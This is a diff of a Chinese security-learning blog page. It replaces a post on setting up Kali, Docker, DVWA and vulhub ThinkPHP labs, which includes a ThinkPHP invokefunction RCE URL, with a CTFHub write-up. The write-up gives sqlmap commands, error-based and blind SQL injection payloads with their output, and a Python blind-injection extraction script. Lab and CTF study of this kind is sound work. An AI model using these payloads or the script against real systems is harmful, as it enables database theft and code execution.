@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2023/08/29/kali-docker/"/>
+  <link rel="canonical" href="http://example.com/2023/09/12/ctfhub-4/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,20 +31,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>kali-docker - Artemis</title>
-  <meta name="keywords" content="null">
+  <title>CTFHub-4 - Artemis</title>
+  <meta name="keywords" content="-CTFHub,null">
   <meta desc name="description" content="最是人间留不住，朱颜辞镜花辞树。 - weiwei - Artemis">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali-docker">
-<meta property="og:url" content="http://example.com/2023/08/29/kali-docker/index.html">
+<meta property="og:title" content="CTFHub-4">
+<meta property="og:url" content="http://example.com/2023/09/12/CTFHub-4/index.html">
 <meta property="og:site_name" content="Artemis">
-<meta property="og:description" content="基础工具安装 vmwareworkstaionpro虚拟机 kaliforvmware下载   使用切换root用户sudo su apt换源 mousepad&#x2F;etc&#x2F;apt&#x2F;sources.list deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;">
+<meta property="og:description" content="SQL注入二、报错注入方法一	SQLmap注入1python sqlmap.py -u &quot;http:&#x2F;&#x2F;challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;-1&quot; -D sqli  -T flag  -C flag --dump  方法二	手动注入1、查询当前使用的数据库：sqli 12-1 union select">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-08-29T10:46:24.000Z">
-<meta property="article:modified_time" content="2023-08-29T11:59:34.600Z">
+<meta property="article:published_time" content="2023-09-12T09:15:58.000Z">
+<meta property="article:modified_time" content="2023-09-12T10:05:53.845Z">
 <meta property="article:author" content="weiwei">
+<meta property="article:tag" content="-CTFHub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2500,7 +2501,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/29/kali-docker/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/12/CTFHub-4/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Artemis">
   </span>
@@ -2521,7 +2522,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        kali-docker
+        CTFHub-4
       </h1>
       <div class='new-meta-box'>
         
@@ -2542,10 +2543,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-08-29T18:46:24+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-09-12T17:15:58+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Aug 29, 2023</p>
+    <p>发布于：Sep 12, 2023</p>
   </a>
 </div>
 
@@ -2568,77 +2569,71 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="基础工具安装"><a href="#基础工具安装" class="headerlink" title="基础工具安装"></a>基础工具安装</h2><ul>
-<li>vmwareworkstaionpro虚拟机</li>
-<li>kaliforvmware下载</li>
-</ul>
-<hr>
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="切换root用户"><a href="#切换root用户" class="headerlink" title="切换root用户"></a>切换root用户</h4><p>sudo su</p>
-<h4 id="apt换源"><a href="#apt换源" class="headerlink" title="apt换源"></a>apt换源</h4><ul>
-<li>mousepad&#x2F;etc&#x2F;apt&#x2F;sources.list</li>
-<li>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contribdeb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib（记得保存）</li>
-<li>apt update</li>
-</ul>
-<h4 id="虚拟化入门"><a href="#虚拟化入门" class="headerlink" title="虚拟化入门"></a>虚拟化入门</h4><h5 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h5><ul>
-<li><code>apt install docker.io</code></li>
-<li><code>systemctl start docker</code></li>
-<li><code>systemctl restart docker</code></li>
-<li><code>systemctl stop docker</code></li>
-</ul>
-<h5 id="docker下载镜像的方式"><a href="#docker下载镜像的方式" class="headerlink" title="docker下载镜像的方式"></a>docker下载镜像的方式</h5><p>dockerhub：<a target="_blank" rel="noopener" href="https://hub.docker.com/">https://hub.docker.com/</a></p>
-<h5 id="docker加速器【阿⾥云加速器】"><a href="#docker加速器【阿⾥云加速器】" class="headerlink" title="docker加速器【阿⾥云加速器】"></a>docker加速器【阿⾥云加速器】</h5><p>首先访问链接，登陆阿里云账号，获取到自己的加速器地址：<a target="_blank" rel="noopener" href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
-<p>获取到加速器地址后进⼊kali进行配置<code>mousepad/etc/docker/daemon.json</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;：[&quot;https://8alxb2ln.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h3><h4 id="方法一SQLmap注入"><a href="#方法一SQLmap注入" class="headerlink" title="方法一	SQLmap注入"></a>方法一	SQLmap注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure>
 
-<p>保存后重启docker</p>
-<h4 id="docker下载镜像"><a href="#docker下载镜像" class="headerlink" title="docker下载镜像"></a>docker下载镜像</h4><ul>
-<li><code>docker pull mattrayner/lamp</code>（镜像名字）</li>
-<li><code>docker images</code>  查看已经下载好的镜像</li>
-<li><code>docker rmi</code>  镜像ID删除已经下载好的镜像</li>
-</ul>
-<h4 id="docker安装镜像为容器"><a href="#docker安装镜像为容器" class="headerlink" title="docker安装镜像为容器"></a>docker安装镜像为容器</h4><p><code>docker run -dit -p 80:80 mattrayner/lamp</code></p>
-<h4 id="docker操作容器"><a href="#docker操作容器" class="headerlink" title="docker操作容器"></a>docker操作容器</h4><ul>
-<li><code>docker ps -a</code>查看已经安装好的容器</li>
-<li><code>docker stop 2a7</code>关闭容器[就是关机]</li>
-<li><code>docker start 2a7</code>开启容器[就是开机]</li>
-<li><code>docker exec -it 2a7</code> bash进⼊容器[可以理解为登陆到系统⾥⾯]</li>
-<li><code>docker rm -f 2a7</code></li>
-</ul>
-<h3 id="docker安装dvwa"><a href="#docker安装dvwa" class="headerlink" title="docker安装dvwa"></a>docker安装dvwa</h3><p>docker搭建dvwa</p>
-<ol>
-<li>先在dockerhub上搜索dvwa</li>
-<li><code>docker pull sagikazarmark/dvwa</code></li>
-<li><code>docker run -dit -p 80:80 sagikazarmark/dvwa</code></li>
-<li>访问127.0.0.1或kali的eth0网卡的IP地址</li>
-<li>删除dvwa容器 <code>docker rm -f 916</code>[再次提醒这里的916是随机的，每个人都不⼀样，dockerps-a能够看到你自己的容器ID，取前三位就行。这里容器也可以不删除，但是80端口会被占用，后面的操作都要改端口]</li>
-</ol>
-<h3 id="docker-compose自动化docker部署"><a href="#docker-compose自动化docker部署" class="headerlink" title="docker-compose自动化docker部署"></a>docker-compose自动化docker部署</h3><ol>
-<li><p>Kali安装docker-compose </p>
-<p><code>apt install docker-compose</code></p>
-</li>
-<li><p>docker-compose搭建thinkphp</p>
-<p>在任意目录创建文件docker-compose.yaml并写入下列内容</p>
-<p><code>mousepad docker-compose.yaml</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line"> web:</span><br><span class="line">   image:vulhub/thinkphp:5.0.23</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;8080:80&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行<code>docker-compose up -d</code>即可启动thinkphp5.0.23 [要注意执⾏docker-compose up -d命令的当前文件夹里必须要有docker-compose.yaml这个文件]</p>
-</li>
-<li><p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
-</li>
-<li><p>终止thinkphp：<code>docker-compose down</code></p>
-</li>
-</ol>
+<h4 id="方法二手动注入"><a href="#方法二手动注入" class="headerlink" title="方法二	手动注入"></a>方法二	手动注入</h4><p>1、查询当前使用的数据库：sqli</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e, database(),0x7e),1)</span><br><span class="line">-1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select updatexml(1, concat(0x7e, database(),0x7e),1)</span><br><span class="line">查询错误: XPATH syntax error: &#x27;~sqli~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>2、查询数据库表名：flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat( table_name))from information_schema.tables where table_schema=&quot;sqli&quot;),0x7e),1)</span><br><span class="line">-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27;limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select updatexml(1, concat(0x7e,( select( group_concat( table_name))from information_schema.tables where table_schema=&quot;sqli&quot;),0x7e),1)</span><br><span class="line">查询错误: XPATH syntax error: &#x27;~news,flag~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>3、获取表的字段名：flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat(column_name))from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;),0x7e),1)</span><br><span class="line">-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27; limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select updatexml(1, concat(0x7e,( select( group_concat(column_name))from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;),0x7e),1)</span><br><span class="line">查询错误: XPATH syntax error: &#x27;~flag~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>4、获取指定数据库的表的列的内容(得到flag)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat(flag)) from sqli.flag),0x7e),1)</span><br><span class="line">-1 and updatexml(1,concat(0x7e,(select flag from sqli.flag limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select updatexml(1, concat(0x7e,( select( group_concat(flag)) from sqli.flag),0x7e),1)</span><br><span class="line">查询错误: XPATH syntax error: &#x27;~ctfhub&#123;74a09bf882367b22ea960956&#x27;</span><br></pre></td></tr></table></figure>
+
 <hr>
-<h3 id="使用docker-compose搭建thinkphp5-0-9版本，并尝试攻击"><a href="#使用docker-compose搭建thinkphp5-0-9版本，并尝试攻击" class="headerlink" title="使用docker-compose搭建thinkphp5.0.9版本，并尝试攻击"></a>使用docker-compose搭建thinkphp5.0.9版本，并尝试攻击</h3><p><code>http://你的kaliIP地址:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p>
+<h3 id="三、布尔、时间盲注"><a href="#三、布尔、时间盲注" class="headerlink" title="三、布尔、时间盲注"></a>三、布尔、时间盲注</h3><h4 id="方法一SQLmap注入-1"><a href="#方法一SQLmap注入-1" class="headerlink" title="方法一	SQLmap注入"></a>方法一	SQLmap注入</h4><h4 id="方法二手动注入-1"><a href="#方法二手动注入-1" class="headerlink" title="方法二	手动注入"></a>方法二	手动注入</h4><p>1、猜解库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (length(database()))=4	#得出库名长度为4</span><br><span class="line">-1 and if (length(database())=4,sleep(5),1)	</span><br></pre></td></tr></table></figure>
+
+<p>2、猜解当前数据库名称</p>
+<ul>
+<li>利用ASCII码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr(database(),1,1)))=115		#得出第一个为s</span><br><span class="line">-1 and (ascii(substr(database(),2,1)))=		#得出第二个为...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用sleep()</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 and if ((ascii(substr(database(),1,1))=115),sleep(5),1)		#延时则说明第一个为s</span><br></pre></td></tr></table></figure>
+
+<p>依次得出4个为sqli</p>
+<p>3、判断表名</p>
+<ul>
+<li>利用ASCII</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=102		#得出第一个为f</span><br><span class="line">-1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))= 		#得出第一个为...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用sleep()</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 and if ((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102),sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>依次得出表名为flag</p>
+<p>4、判断字段名</p>
+<ul>
+<li>利用ASCII</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 and (ascii(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),1,1)))=102		#得出f</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用sleep()</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 and if ((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),1,1))=102),sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>依次得出字段名为flag</p>
+<h4 id="方法三脚本注入"><a href="#方法三脚本注入" class="headerlink" title="方法三	脚本注入"></a>方法三	脚本注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class InjeSql(object):</span><br><span class="line">    def __init__(self, url, payload_length, payload_Data, name, conditions, name_length, max_len=12):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.payload_length = payload_length</span><br><span class="line">        self.payload_Data = payload_Data</span><br><span class="line">        self.max_len = max_len  # 数据库名、表名等长度上限</span><br><span class="line">        self.conditions = conditions</span><br><span class="line">        self.name = name</span><br><span class="line">        self.name_length = name_length</span><br><span class="line"></span><br><span class="line">    def getLength(self):</span><br><span class="line">        for i in range(1, self.max_len):</span><br><span class="line">            payload = self.payload_length % i</span><br><span class="line">            r = requests.get(self.url + payload + &#x27;%23&#x27;)</span><br><span class="line"></span><br><span class="line">            if self.conditions in r.text:</span><br><span class="line">                self.name_leng = i</span><br><span class="line">                print(self.name+&quot;的长度是&quot;, i)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    def getData(self):</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, self.name_length + 1):</span><br><span class="line">            for i in &#x27;abcdefghijklmnopqrstuvwxyz&#125;&#123;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;:</span><br><span class="line">                url = self.url + self.payload_Data % (j, i)</span><br><span class="line">                r = requests.get(url + &#x27;%23&#x27;)</span><br><span class="line">                if &#x27;query_success&#x27; in r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line">        print(self.name+&quot;:&quot;+name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	#  换成自己的url</span><br><span class="line">    url = &quot;&quot;</span><br><span class="line">    # 注意修改payload中数据库名、表名等数据</span><br><span class="line">    payloads_length = [</span><br><span class="line">        # 0.数据库的长度</span><br><span class="line">        &quot; and length(database())&gt;%s&quot;,</span><br><span class="line">        # 1.表的数量</span><br><span class="line">        &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;)&gt;%s&quot;,</span><br><span class="line">        # 2.开始猜解flag表的字段数</span><br><span class="line">        &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)&gt;%s&quot;</span><br><span class="line">    ]</span><br><span class="line">    payloads_Data = [</span><br><span class="line">        # 0.数据库的名称：</span><br><span class="line">        &quot; and substr(database(),%d,1)=&#x27;%s&#x27;&quot;,</span><br><span class="line">        # 1.第一张表的名称：</span><br><span class="line">        &quot; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1)=&#x27;%s&#x27;&quot;,</span><br><span class="line">        # 2.第二张表的名称：</span><br><span class="line">        &quot; and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),%d,1)=&#x27;%s&#x27;&quot;,</span><br><span class="line">        # 3.字段名称</span><br><span class="line">        &quot; and substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27;),%d,1)=&#x27;%s&#x27;&quot;,</span><br><span class="line">        # 4.flag：</span><br><span class="line">        &quot; and substr((select * from sqli.flag where id=1),%d,1)=&#x27;%s&#x27;&quot;</span><br><span class="line">    ]</span><br><span class="line">    names = [</span><br><span class="line">        &quot;数据库名&quot;,</span><br><span class="line">        &quot;表名1&quot;,</span><br><span class="line">        &quot;表名2&quot;,</span><br><span class="line">        &quot;字段名&quot;,</span><br><span class="line">        &quot;flag&quot;</span><br><span class="line">    ]</span><br><span class="line">    conditions = &#x27;query_error&#x27;</span><br><span class="line">    conditions2 = &#x27;query_success&#x27;</span><br><span class="line">    name_length = 32  #数据长度</span><br><span class="line">    #  想测什么换下下标就行</span><br><span class="line">    injesql = InjeSql(url=url, payload_length=payloads_length[0], payload_Data=payloads_Data[4], name=names[3], name_length=name_length, conditions=conditions)</span><br><span class="line">    # injesql.getLength() # 测长度</span><br><span class="line">    injesql.getData()  # 测数据</span><br></pre></td></tr></table></figure>
+
 <hr>
-<h3 id="如何用一个接口开多个源"><a href="#如何用一个接口开多个源" class="headerlink" title="如何用一个接口开多个源"></a>如何用一个接口开多个源</h3><p>将不同源放于不同文件夹</p>
-<p>mkdir thinkphp5.0.23</p>
-<p>mkdir thinkphp5.0.9</p>
-<p>cd thinkphp5.0.23</p>
-<p>mousepad docker-compose.yaml</p>
-<p>cd ..</p>
-<p>cd thinkphp5.0.9</p>
-<p>mousepad docker-compose.yaml</p>
 
   </div>
   
@@ -2663,10 +2658,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-08-29T19:59:34+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-09-12T18:05:53+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Aug 29, 2023</p>
+    <p>更新于：Sep 12, 2023</p>
   </a>
 </div>
 
@@ -2674,6 +2669,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         
           
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTFHub/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>-CTFHub</p></a></div>
+  <span hidden itemprop="keywords">-CTFHub</span>
+
 
         
       
@@ -2685,7 +2684,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/08/29/kali-docker/&title=kali-docker - Artemis&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
           
           >
           
@@ -2697,7 +2696,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/08/29/kali-docker/&title=kali-docker - Artemis&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
           
           >
           
@@ -2709,7 +2708,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/08/29/kali-docker/&title=kali-docker - Artemis&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/09/12/CTFHub-4/&title=CTFHub-4 - Artemis&summary="
           
           >
           
@@ -2742,18 +2741,27 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2023/08/29/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>外网渗透信息收集</p>
-          <p class='content'>信息收集企业信息收集之域名信息收集1.通过域名找到公司
-ICP备案：https://icp.chinaz.com/
-Whois：https://www.ggcx.com/main/whois
-证...</p>
-        </a>
       
-      
-        <a class='next' href='/2023/04/01/mysql-2-0/'>
-          <p class='title'>mysql-2.0<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'></p>
+        <a class='next' href='/2023/09/11/CTFHub-3/'>
+          <p class='title'>CTFHub-3<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>响应包源代码
+
+
+名称
+描述
+
+
+
+选取页面中的元素
+通常使用选取页面中的元素是为了定位网页的源代码
+
+
+查看器
+使用页面检查器检查和修改页面的 HTML 和 CSS
+
+
+控制台
+控制台主要是记...</p>
         </a>
       
     </div>
@@ -2769,7 +2777,7 @@ Whois：https://www.ggcx.com/main/whois
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2023/08/29/kali-docker/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/09/12/CTFHub-4/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2811,7 +2819,7 @@ Whois：https://www.ggcx.com/main/whois
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="toc-text">基础工具安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%87%E6%8D%A2root%E7%94%A8%E6%88%B7"><span class="toc-text">切换root用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apt%E6%8D%A2%E6%BA%90"><span class="toc-text">apt换源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8"><span class="toc-text">虚拟化入门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kali%E5%AE%89%E8%A3%85docker"><span class="toc-text">kali安装docker</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">docker下载镜像的方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker%E5%8A%A0%E9%80%9F%E5%99%A8%E3%80%90%E9%98%BF%E2%BE%A5%E4%BA%91%E5%8A%A0%E9%80%9F%E5%99%A8%E3%80%91"><span class="toc-text">docker加速器【阿⾥云加速器】</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F"><span class="toc-text">docker下载镜像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E5%AE%89%E8%A3%85%E9%95%9C%E5%83%8F%E4%B8%BA%E5%AE%B9%E5%99%A8"><span class="toc-text">docker安装镜像为容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E6%93%8D%E4%BD%9C%E5%AE%B9%E5%99%A8"><span class="toc-text">docker操作容器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E5%AE%89%E8%A3%85dvwa"><span 